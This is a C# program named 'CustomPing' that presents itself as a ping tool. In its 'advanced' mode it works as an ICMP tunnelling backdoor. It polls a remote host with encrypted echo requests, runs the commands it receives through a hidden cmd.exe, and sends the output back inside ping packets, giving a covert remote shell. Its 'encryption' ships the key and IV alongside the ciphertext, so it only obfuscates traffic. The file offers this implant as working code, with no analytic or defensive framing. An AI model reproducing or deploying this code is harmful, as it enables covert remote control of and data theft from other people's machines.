using System;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.IO;
using System.Security.Cryptography;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length == 0)
        {
            Console.WriteLine("Usage: CustomPing [advanced] <IP address> <message>");
            return;
        }

        string mode = args[0].ToLower();

        if (mode == "advanced")
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: CustomPing advanced <IP address> <message>");
                return;
            }

            string ipAddress = args[1];
            string messageToSend = args[2];
            int timeoutMilliseconds = 10000; // 10 seconds
            RunCustomPing(ipAddress, messageToSend, timeoutMilliseconds);
        }
        else
        {
            CallPing32Exe(args);
        }
    }

    static void RunCustomPing(string ipAddress, string messageToSend, int timeoutMilliseconds)
    {
        try
        {
            Ping pingSender = new Ping();

            // Encrypt the message and create the buffer for sending
            string messageToSend_ENC = AESEncryptString(messageToSend);
            byte[] buffer_enc = Encoding.ASCII.GetBytes(Convert.ToBase64String(Encoding.ASCII.GetBytes(messageToSend_ENC)));

            // Send the custom ICMP Echo Request packet
            PingReply reply = pingSender.Send(ipAddress, timeoutMilliseconds, buffer_enc);

            // Handle the reply
            if (reply.Status == IPStatus.Success)
            {
                Console.WriteLine("Custom ICMP Echo Request sent successfully.");
                Console.WriteLine($"IP Address: {reply.Address}");
                Console.WriteLine($"Roundtrip Time: {reply.RoundtripTime} ms");
                Console.WriteLine($"Time to Live (TTL): {reply.Options.Ttl}");
                Console.WriteLine($"Buffer Size: {reply.Buffer.Length} bytes");
                Console.WriteLine($"Buffer Data (Hex): {ByteArrayToHexString(reply.Buffer)}");
                Console.WriteLine($"Buffer Data (ASCII): {Encoding.ASCII.GetString(reply.Buffer)}");

                // Decrypt and handle the response
                ParseReceivedData(reply.Buffer, out byte[] encryptedResponse, out byte[] responseKey, out byte[] responseIV);

                string decryptedResponse = AESDecrypt(encryptedResponse, responseKey, responseIV);

                if (decryptedResponse.StartsWith("shellstart"))
                {
                    // Enter shell mode
                    HandleShellMode(pingSender, ipAddress, timeoutMilliseconds);
                }
                else if (decryptedResponse.StartsWith("job:"))
                {
                    // Execute the job command
                    string command = decryptedResponse.Substring(4).Trim();
                    Console.WriteLine($"Received command: {command}");
                    string result = ExecuteCommand(command);
                    SendResult(ipAddress, $"result: {result}");
                }
                else
                {
                    Console.WriteLine($"Failed to process custom ICMP Echo Request. Invalid response: {decryptedResponse}");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error occurred: {ex.Message}");
        }
    }

    static void HandleShellMode(Ping pingSender, string ipAddress, int timeoutMilliseconds)
    {
        while (true)
        {
            string messageToSend_ENC2 = AESEncryptString("shelltodo");
            byte[] buffer_enc2 = Encoding.ASCII.GetBytes(Convert.ToBase64String(Encoding.ASCII.GetBytes(messageToSend_ENC2)));

            // Send the custom ICMP Echo Request packet
            PingReply shellReply = pingSender.Send(ipAddress, timeoutMilliseconds, buffer_enc2);

            string receivedData2 = Encoding.ASCII.GetString(shellReply.Buffer);
            ParseReceivedData(shellReply.Buffer, out byte[] encryptedResponse2, out byte[] responseKey2, out byte[] responseIV2);

            string decryptedResponse2 = AESDecrypt(encryptedResponse2, responseKey2, responseIV2);

            if (shellReply.Status == IPStatus.Success)
            {
                if (decryptedResponse2.StartsWith("shellexit"))
                {
                    Console.WriteLine("Received shellexit. Exiting the loop.");
                    break;
                }
                else if (decryptedResponse2.StartsWith("shelljob:"))
                {
                    string command = decryptedResponse2.Substring(9).Trim();
                    Console.WriteLine($"Received command: {command}");
                    string result = ExecuteCommand(command);
                    SendResult(ipAddress, $"shellresult: {result}");
                }
                else
                {
                    Console.WriteLine($"Received command: {decryptedResponse2}");
                }
            }
            else
            {
                Console.WriteLine("No response received.");
            }

            // Add a delay between shell requests
        }
    }

    static string ByteArrayToHexString(byte[] bytes)
    {
        StringBuilder hex = new StringBuilder(bytes.Length * 2);
        foreach (byte b in bytes)
        {
            hex.AppendFormat("{0:X2} ", b);
        }
        return hex.ToString().Trim();
    }

    static string ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            Process process = new Process();
            process.StartInfo = psi;
            process.Start();

            string result = process.StandardOutput.ReadToEnd();

            process.WaitForExit();
            return result;
        }
        catch (Exception ex)
        {
            return $"Error executing command: {ex.Message}";
        }
    }

    static void SendResult(string ipAddress, string result)
    {
        Console.WriteLine($"Send ping reply: {result}");
        string result_enc = AESEncryptString("result: " + result);
        byte[] buffer = Encoding.ASCII.GetBytes(Convert.ToBase64String(Encoding.ASCII.GetBytes(result_enc)));

        using (Ping pingSender = new Ping())
        {
            // Send the custom ICMP Echo Request packet with the result
            pingSender.Send(ipAddress, 500, buffer);
        }
    }

    static string AESEncryptString(string message)
    {
        byte[] key;
        byte[] iv;

        using (Aes aes = Aes.Create())
        {
            aes.GenerateKey();
            aes.GenerateIV();
            key = aes.Key;
            iv = aes.IV;
        }

        byte[] encryptedMessage = AESEncrypt(Encoding.UTF8.GetBytes(message), key, iv);
        string messageToSend = Convert.ToBase64String(encryptedMessage) + "|" + Convert.ToBase64String(key) + "|" + Convert.ToBase64String(iv);
        return messageToSend;
    }

    static string AESDecrypt(byte[] ciphertext, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;

            using (MemoryStream memoryStream = new MemoryStream(ciphertext))
            using (MemoryStream decryptedStream = new MemoryStream())
            {
                ICryptoTransform decryptor = aes.CreateDecryptor();
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        decryptedStream.Write(buffer, 0, bytesRead);
                    }
                }
                return Encoding.UTF8.GetString(decryptedStream.ToArray());
            }
        }
    }

    static byte[] AESEncrypt(byte[] plainText, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                ICryptoTransform encryptor = aes.CreateEncryptor();
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(plainText, 0, plainText.Length);
                    cryptoStream.FlushFinalBlock();
                    return memoryStream.ToArray();
                }
            }
        }
    }

    static void CallPing32Exe(string[] args)
    {
        try
        {
            // ... Existing code ...
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error calling ping32.exe: {ex.Message}");
        }
    }

    // Add this method to the Program class
    static void ParseReceivedData(byte[] buffer, out byte[] encryptedResponse, out byte[] responseKey, out byte[] responseIV)
    {
        string receivedData = Encoding.ASCII.GetString(buffer);
        string[] responseParts = receivedData.Split('|');
        encryptedResponse = Convert.FromBase64String(responseParts[0]);
        responseKey = Convert.FromBase64String(responseParts[1]);
        responseIV = Convert.FromBase64String(responseParts[2]);
    }
}
